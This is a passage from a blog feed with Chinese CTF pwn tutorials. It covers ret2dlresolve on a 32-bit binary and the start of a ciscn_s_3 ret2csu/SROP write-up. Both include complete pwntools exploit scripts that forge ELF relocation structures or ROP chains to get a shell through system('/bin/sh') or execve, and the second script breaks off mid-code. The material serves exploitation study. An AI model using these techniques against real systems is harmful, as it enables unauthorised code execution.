alt="img"></p><p>下面就是.rel.plt段，把read对应的0x80483a8减去.rel.plt开头地址0x8048398就是0x10,</p><p>所以realoc_index简单的理解就是对应函数的结构体到.rel.plt段的偏移(后面会详细讲.rel.plt段的构成，要结合着理解）</p><p><img src="/img/ret2alsolve/g.png" alt="img"></p><p>接下来我会介绍.dynamic段、.dynstr段、.dynsym段、.rel.plt段</p><p>每个段的寻找可以借助objump工具</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">objdump -s -j <span class="hljs-selector-class">.dynsym</span> pwn   <span class="hljs-comment">//pwn是可执行文件</span><br>objdump -s -j <span class="hljs-selector-class">.dynstr</span> pwn<br>objdump -s -j <span class="hljs-selector-class">.dynamic</span> pwn<br>objdump -s -j <span class="hljs-selector-class">.rel</span><span class="hljs-selector-class">.plt</span> pwn<br></code></pre></td></tr></table></figure><p>.dynamic段是用来存储动态链接程序的特定信息的，在这里我们不用特别里了解</p><h3 id="dynstr-段"><a href="#dynstr-段" class="headerlink" title=".dynstr 段"></a>.dynstr 段</h3><p>存放了各个函数的名称字符串。</p><p><img src="/img/ret2alsolve/h.png" alt="img"></p><h3 id="dynsym-段"><a href="#dynsym-段" class="headerlink" title=".dynsym 段"></a>.dynsym 段</h3><p>由 Elf_Sym 结构体集合而成</p><p><img src="/img/ret2alsolve/i.png" alt="img"></p><p>其中的 Elf_Sym 结构体如代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    ELF32_Word st_name;<br>    ELF32_Addr st_value;<br>    ELF32_Word st_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_info;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_other;<br>    Elf32_Section st_shndx;<br>&#125; Elf32_Sym;<br></code></pre></td></tr></table></figure><p>这里面唯一需要知道的就是st_name,这个对应的是这个结构体相对于.dynstr段的偏移，根据这个就可以找到.dynstr段的位置</p><h3 id="rel-plt-段"><a href="#rel-plt-段" class="headerlink" title=".rel.plt 段"></a>.rel.plt 段</h3><p>由 Elf_Rel 结构体集合而成</p><p><img src="/img/ret2alsolve/j.png" alt="img"></p><p>其中的 Elf_Rel 结构体如代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    ELF32_Addr r_offset;<br>    ELF32_Addr r_info;<br>&#125; Elf32_Rel;<br></code></pre></td></tr></table></figure><p>其中r_offest对应的是函数在got表，r_info又移动8位后用来表示这个函数的标识符在.dynsym段的位置，例如，你运行的是read函数，那么r_info&lt;&lt;8就是read对应的结构体距离.dymsym段的位置</p><h3 id="联系"><a href="#联系" class="headerlink" title="联系"></a>联系</h3><p>这几段的关系是这样的，通过link_map_obj定位.dynamic段，在通过偏移定位到.rel.plt段，.dynstr段，.dynsym段，这里的偏移程序会给，不用我们操心，然后再通过realoc_index来确定.rel.plt段对应的函数结构体，从而找到对应函数的got表位置，再通过(r_info&lt;&lt;8)找到.dynsym段对应的该函数的ELF_Sym结构体，再通过st_name找到.dynstr段中对应函数的字符串，然后根据字符串到libc文件中找到对应的地址。如图所示</p><p><img src="/img/ret2alsolve/k.png" alt="img"></p><p>_dl_runtime_resolve 函数实际上就只是调用了 _dl_fixup 函数，其函数代码大致如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp">_dl_fixup(<span class="hljs-keyword">struct</span> link_map *l,<span class="hljs-built_in">ElfW</span>(Word) reloc_arg)<br>&#123;<br>    <span class="hljs-comment">// 首先通过参数reloc_arg计算重定位的入口，这里的JMPREL即.rel.plt，reloc_offest即reloc_arg</span><br>    <span class="hljs-type">const</span> PLTREL *<span class="hljs-type">const</span> reloc = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *)(<span class="hljs-built_in">D_PTR</span>(l, l_info[DT_JMPREL]) + reloc_offset);<br>    <span class="hljs-comment">// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span><br>    <span class="hljs-function"><span class="hljs-type">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Sym)</span> *sym </span>= &amp;symtab[<span class="hljs-built_in">ELFW</span>(R_SYM) (reloc-&gt;r_info)];<br>    <span class="hljs-comment">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JMUP_SLOT=7</span><br>    <span class="hljs-built_in">assert</span>(<span class="hljs-built_in">ELF</span>(R_TYPE)(reloc-&gt;info) == ELF_MACHINE_JMP_SLOT);<br>    <span class="hljs-comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span><br>    result = _dl_lookup_symbol_x (strtab + sym -&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span><br>    value = <span class="hljs-built_in">DL_FIXUP_MAKE_VALUE</span> (result, sym ? (<span class="hljs-built_in">LOOKUP_VALUE_ADDRESS</span>(result) + sym-&gt;st_value) : <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// 最后把value写入相应的GOT表条目中</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">elf_machine_fixup_plt</span> (l, result, reloc, rel_addr, value);    <br>&#125;<br></code></pre></td></tr></table></figure><p>这里唯一要注意的就是这个函数的运行会检查r_info的低位是否等于7。</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">vuln</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x30</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">setbuf</span>(stderr, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">init</span>();<br>    <span class="hljs-built_in">vuln</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译(自己编译出来的文件因libc版本不同，地址可能跟我有些差异)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">gcc -w -fno-stack-protector -z relro -no-pie -fno-pie <span class="hljs-number">1.</span>c -m32 -o pwn<br></code></pre></td></tr></table></figure><p>首先我们先用栈溢出来模拟puts函数的动态链接调用过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>io=process(<span class="hljs-string">&#x27;./ret21&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./ret21&#x27;</span>)<br>leave=<span class="hljs-number">0x080491F2</span><br>ret=<span class="hljs-number">0x804900a</span><br>PLT0=<span class="hljs-number">0x8049020</span><br>buf=elf.bss()+<span class="hljs-number">0x800</span><br>rel_plt=<span class="hljs-number">0x8048398</span><br>dynsym=<span class="hljs-number">0x804821c</span><br>dynstr=<span class="hljs-number">0x80482bc</span><br><span class="hljs-comment">#gdb.attach(io,&#x27;b*vuln&#x27;)</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p32(buf) + p32(elf.sym[<span class="hljs-string">&#x27;read&#x27;</span>]) + p32(leave) + p32(<span class="hljs-number">0</span>) + p32(buf) + p32(<span class="hljs-number">0x100</span>)<br>io.sendafter(<span class="hljs-string">b&#x27;&gt; \n&#x27;</span>,payload)<br>sleep(<span class="hljs-number">3</span>)<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(PLT0)+p32(<span class="hljs-number">0x18</span>)+p32(<span class="hljs-number">0</span>)+p32(buf-<span class="hljs-number">0x14</span>)+<span class="hljs-string">b&#x27;Haker&#x27;</span><br>io.send(payload2)<br>pause()<br></code></pre></td></tr></table></figure><p><img src="/img/ret2alsolve/l.png" alt="img"></p><p>在这个代码中，我们先进行了栈迁移，之后模拟已经将 0x18 (puts 函数的 realoc_index 参数）已经压入栈，接着执行 PLT0，压入 link_map_obj 参数，然后执行 _dl_runtime_resolve 函数，之后解析完成那么就能够接着执行 puts(“Hacker!”) 打印出 Hacker!</p><p>因为这个解析函数是依靠各个段中的对应函数结构体构成的，那么，我们是否可以通过伪造结构体来执行我们想要执行的函数，这就是今天的重点</p><p>ret2dlsolve的rop技术</p><p>接下来我会通过构造结构体来puts(‘Hacker!’）</p><h4 id="伪造-dynstr段上的字符串"><a href="#伪造-dynstr段上的字符串" class="headerlink" title="伪造.dynstr段上的字符串"></a>伪造.dynstr段上的字符串</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># set fake_st_name</span><br>fake_st_name = buf + xx - .dynstr //xx指的是栈上的栈上偏移<br>我们会在payload上构造字符串<br></code></pre></td></tr></table></figure><h4 id="构造ELF-Sym结构体"><a href="#构造ELF-Sym结构体" class="headerlink" title="构造ELF_Sym结构体"></a>构造ELF_Sym结构体</h4><p>前面可知，此结构体有6个参数，实际上只需要伪造st_name就可以了，其他的不变</p><p>所以</p><p><img src="/img/ret2alsolve/m.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#set fake_Elf_Sym</span><br>fake_Elf_Sym = p32(fake_st_name) + p32(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p32(<span class="hljs-number">0x12</span>) + p32(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h4 id="构造ELF-Rel结构体"><a href="#构造ELF-Rel结构体" class="headerlink" title="构造ELF_Rel结构体"></a>构造ELF_Rel结构体</h4><p>首先要解决的问题就是，realoc_index的问题，上面已经详细讲过，realoc_index实际上就是对应函数结构体到rel.plt段的偏移,由前面可知，此结构体有两个参数，一个是对应函数的got表，一个是r_info表示EFL_Sym结构体到.dynsym段的偏移，还有就是_dl_fixup 函数执行时会检查r_info的低位是否为7</p><p>所以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">realoc_index=fake_ELF_REL-rel_plt<br>r_sym = <span class="hljs-built_in">int</span>((buf + xx - .dynsym)/<span class="hljs-number">0x10</span>)   //这里是为了去掉低位<br>r_info = (r_sym &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-number">7</span>  //这里左移<span class="hljs-number">8</span>位后+<span class="hljs-number">7</span>是为了绕过判定再右移<span class="hljs-number">8</span>位后不会破坏地址<br></code></pre></td></tr></table></figure><p>最终的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>io=process(<span class="hljs-string">&#x27;./ret21&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./ret21&#x27;</span>)<br>leave=<span class="hljs-number">0x080491F2</span><br>ret=<span class="hljs-number">0x804900a</span><br>PLT0=<span class="hljs-number">0x8049020</span><br>buf=elf.bss()+<span class="hljs-number">0x800</span><br>rel_plt=<span class="hljs-number">0x8048398</span><br>dynsym=<span class="hljs-number">0x804821c</span><br>dynstr=<span class="hljs-number">0x80482bc</span><br><span class="hljs-comment">#gdb.attach(io,&#x27;b*vuln&#x27;)</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p32(buf) + p32(elf.sym[<span class="hljs-string">&#x27;read&#x27;</span>]) + p32(leave) + p32(<span class="hljs-number">0</span>) + p32(buf) + p32(<span class="hljs-number">0x100</span>)<br>io.sendafter(<span class="hljs-string">b&#x27;&gt; \n&#x27;</span>,payload)<br>sleep(<span class="hljs-number">3</span>)<br><span class="hljs-comment"># set fake_st_name</span><br>fake_st_name = buf + <span class="hljs-number">0x34</span> - dynstr<br><br><span class="hljs-comment"># set fake_Elf_Sym</span><br>r_sym = (buf + <span class="hljs-number">0x1c</span> - dynsym) / <span class="hljs-number">0x10</span> <br>r_type = <span class="hljs-number">7</span><br>r_info = (<span class="hljs-built_in">int</span>(r_sym) &lt;&lt; <span class="hljs-number">8</span>) + r_type   <span class="hljs-comment">#r_sym对应的是构造的sym在dynsym的偏移，在执行时应该会加上dynsym的地址</span><br>puts_str_addr = <span class="hljs-number">0x80482F3</span><br>fake_Elf_Sym = p32(fake_st_name) + p32(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p32(<span class="hljs-number">0x12</span>) + p32(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br><br><span class="hljs-comment"># set fake_Elf_Rel</span><br>realoc_index = buf + <span class="hljs-number">0x14</span> - rel_plt <span class="hljs-comment">#plt表中的索引可能是rel_plt到对应结构体的偏移</span><br>fake_Elf_Rel = p32(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]) + p32(r_info) <span class="hljs-comment">#这里p32(elf.got[&#x27;read&#x27;])的作用是把在libc中的system实际地址写入read的got表处</span><br><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span> + p32(PLT0) + p32(realoc_index) + p32(<span class="hljs-number">0</span>) + p32(buf + <span class="hljs-number">0x3a</span>) //这里存在对齐问题，如果是p32(buf+<span class="hljs-number">0x3c</span>)的话只会打出<span class="hljs-string">&#x27;rker&#x27;</span><br>payload +=  fake_Elf_Rel <span class="hljs-comment"># buf + 0x14 #p32(PLT0)相当于调用_dl_runtime_resolve函数，并且PLT0会提供第一个参数，那么我们就要接着输入第二个参数p32(realoc_index)</span><br>payload += fake_Elf_Sym <span class="hljs-comment"># buf + 0x1c</span><br>payload += <span class="hljs-string">b&quot;puts&quot;</span> + p16(<span class="hljs-number">0</span>) <span class="hljs-comment">#buf+0x34</span><br>payload += <span class="hljs-string">b&quot;harker!&quot;</span><br>io.send(payload)<br>io.interactive()<br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure><p><img src="/img/ret2alsolve/n.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>这个实际上就是重新找libc寻找函数地址，写入got表</p><p><img src="/img/ret2alsolve/o.png" alt="img"></p><p>可以看到我们上面的exp中故意写了read的got表，也就是说他重新再libc文件里面寻找puts函数写入了read的got表的位置，这时候read的got表的位置实际上是puts的真实地址了。</p><p>由此我们可以联想到，我们把system函数写入，再输入&#x2F;bin&#x2F;sh\x00,不就可以getshell了吗，事实上也确实如此</p><p>getshell exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>io=process(<span class="hljs-string">&#x27;./ret21&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./ret21&#x27;</span>)<br>leave=<span class="hljs-number">0x080491F2</span><br>ret=<span class="hljs-number">0x804900a</span><br>PLT0=<span class="hljs-number">0x8049020</span><br>buf=elf.bss()+<span class="hljs-number">0x800</span><br>rel_plt=<span class="hljs-number">0x8048398</span><br>dynsym=<span class="hljs-number">0x804821c</span><br>dynstr=<span class="hljs-number">0x80482bc</span><br><span class="hljs-comment">#gdb.attach(io,&#x27;b*vuln&#x27;)</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p32(buf) + p32(elf.sym[<span class="hljs-string">&#x27;read&#x27;</span>]) + p32(leave) + p32(<span class="hljs-number">0</span>) + p32(buf) + p32(<span class="hljs-number">0x100</span>)<br>io.sendafter(<span class="hljs-string">b&#x27;&gt; \n&#x27;</span>,payload)<br>sleep(<span class="hljs-number">3</span>)<br><span class="hljs-comment"># set fake_st_name</span><br>fake_st_name = buf + <span class="hljs-number">0x34</span> - dynstr<br><br><span class="hljs-comment"># set fake_Elf_Sym</span><br>r_sym = (buf + <span class="hljs-number">0x1c</span> - dynsym) / <span class="hljs-number">0x10</span> <span class="hljs-comment">#/0x10是为了减掉后1位  例如int(1001/10)=100,最后+7实现把低位变为7</span><br>r_type = <span class="hljs-number">7</span><br>r_info = (<span class="hljs-built_in">int</span>(r_sym) &lt;&lt; <span class="hljs-number">8</span>) + r_type   <span class="hljs-comment">#r_sym对应的是构造的sym在dynsym的偏移，在执行时应该会加上dynsym的地址</span><br>puts_str_addr = <span class="hljs-number">0x80482F3</span><br>fake_Elf_Sym = p32(fake_st_name) + p32(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p32(<span class="hljs-number">0x12</span>) + p32(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br><br><span class="hljs-comment"># set fake_Elf_Rel</span><br>realoc_index = buf + <span class="hljs-number">0x14</span> - rel_plt <span class="hljs-comment">#plt表中的索引可能是rel_plt到对应结构体的偏移</span><br>fake_Elf_Rel = p32(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]) + p32(r_info) <span class="hljs-comment">#这里p32(elf.got[&#x27;read&#x27;])的作用是把在libc中的system实际地址写入read的got表处</span><br><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span> + p32(PLT0) + p32(realoc_index) + p32(<span class="hljs-number">0</span>) + p32(buf + <span class="hljs-number">0x3c</span>) <span class="hljs-comment">#p32(PLT0)相当于调用_dl_runtime_resolve函数，并且PLT0会提供第一个参数，那么我们就要接着输入第二个参数p32(realoc_index)</span><br>payload +=  fake_Elf_Rel <span class="hljs-comment"># buf + 0x14</span><br>payload += fake_Elf_Sym <span class="hljs-comment"># buf + 0x1c</span><br>payload += <span class="hljs-string">b&quot;system&quot;</span> + p16(<span class="hljs-number">0</span>) <span class="hljs-comment">#buf+0x34</span><br>payload += <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>io.send(payload)<br>io.interactive()<br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure><p><img src="/img/ret2alsolve/p.png" alt="img"></p><p>小白，有错误请指出</p>]]></content>
      
      
      <categories>
          
          <category> 栈利用 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>syscall与csu结合以及srop的简单使用</title>
      <link href="/2024/03/21/srop%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/03/21/srop%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="syscall与csu结合以及srop的简单使用"><a href="#syscall与csu结合以及srop的简单使用" class="headerlink" title="syscall与csu结合以及srop的简单使用"></a>syscall与csu结合以及srop的简单使用</h1><p>基础检查</p><p><img src="/img/srop/a.png" alt="img"></p><p>放入ida</p><p><img src="/img/srop/b.png" alt="img"></p><p>存在栈溢出，并且buf只有0x10，而write有0x30,因此可以泄露栈上的内容</p><p><img src="/img/srop/c.png" alt="img"></p><p>3B&#x3D;59是execv的调用号，这个指令可以调用内核execv</p><p>如果能够知道&#x2F;bin&#x2F;sh的地址，就可以获得shell</p><p>因为栈上没有&#x2F;bin&#x2F;sh,可以考虑read读入，结合前面有漏洞可以泄露栈上的位置，</p><p>考虑用write泄露某一栈上地址，在计算此地址到输入点的偏移，</p><p>这样当我们输入&#x2F;bin&#x2F;sh时就可以得到这个地址</p><p><img src="/img/srop/d.png" alt="img"></p><p><img src="/img/srop/e.png" alt="img"></p><p>这个地址存的是程序名</p><p><img src="/img/srop/f.png" alt="img"></p><p>如图也在泄露范围内</p><p>那么就可以泄露这个地址</p><p><img src="/img/srop/g.png" alt="img"></p><p>可以算出此地址到输入点的偏移为0x118</p><p>所以第一个payload的构造为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(vuln)<br>io.sendline(payload)<br>io.recv(<span class="hljs-number">0x20</span>)<br>binsh=u64(io.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0x118</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(binsh))<br></code></pre></td></tr></table></figure><p> payload2的构造</p><p>方法一</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">pay=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="hljs-number">2</span><br>pay+=p64(pop_csu)<br>pay+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>pay+=p64(binsh+<span class="hljs-number">0x50</span>)<br>pay+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>pay+=p64(mov_call)<br>pay+=p64(mov_rax)<br>pay+=p64(rdi)<br>pay+=p64(binsh)<br>pay+=p64(syscall)<br>io.sendline(pay)<br></code></pre></td></tr></table></figure><p>解释</p><p>在execve的系统调用中</p><p>参数布局为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">rdi=/<span class="hljs-built_in">bin</span>/sh<br><br>rsi=<span class="hljs-number">0</span><br><br>rdx=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><img src="/img/srop/h.png" alt="img"></p><p>因为找不到可用的rsi和rdx</p><p>我们考虑用csu间接将参数传给rsi 和rdx</p><p><img src="/img/srop/i.png" alt="img"></p><p>这个payload的构造非常巧妙 将rbx和rbp设为0，r12设为(binsh+0x50)都有特别用意</p><p>(1)根据我们前面payload的构造</p><p><img src="/img/srop/j.png" alt="img"></p><p>可以知道binsh+0x50就是将execve调用号放入rax的指令，方便进行syscall</p><p>(2)首先将rbx和rbp 设为0</p><p>使得通不过 cmp rbx,rbp</p><p>从而通过jnz指令跳回0x400580</p><p>这时候rbx已被加1，所以这次call的地址就变为(binsh+0x50+8)即pop_rdi的位置让我们能够继续控制程序</p><p>因为rsi 和rdx已经设置完了，那接下来只要将binsh传入rdi并执行syscall即可获得shell</p><p>最终exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io=process(<span class="hljs-string">&#x27;./ciscn_s_3&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./ciscn_s_3&#x27;</span>)<br><br>pop_csu=<span class="hljs-number">0x40059A</span><br>mov_call=<span class="hljs-number">0x400580</span><br>rdi=<span class="hljs-number">0x4005A3</span><br>vuln=<span class="hljs-number">0x4004ED</span><br>mov_rax=<span class="hljs-number">0x4004E2</span><br>syscall=<span class="hljs-number">0x400501</span><br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(vuln)<br>io.sendline(payload)<br>io.recv(<span class="hljs-number">0x20</span>)<br>binsh=u64(io.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0x118</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(binsh))<br>pay=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="hljs-number">2</span>+p64(pop_csu)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(binsh+<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)*<span 